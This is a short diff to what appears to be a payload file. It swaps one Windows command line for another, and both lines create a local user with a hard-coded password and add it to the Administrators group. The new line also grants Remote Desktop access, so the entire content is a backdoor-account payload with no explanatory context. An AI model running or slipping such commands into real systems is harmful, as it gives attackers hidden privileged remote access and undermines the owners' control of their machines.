@@ -1,1 +1,1 @@
-NET USER incompetent prutser /ADD && NET LOCALGROUP Administrators incompetent /ADD
+net user jan-karel C0mpl3x.teit /add; net localgroup "Administrators" /add jan-karel; net localgroup "Remote Desktop Users" /add jan-karel
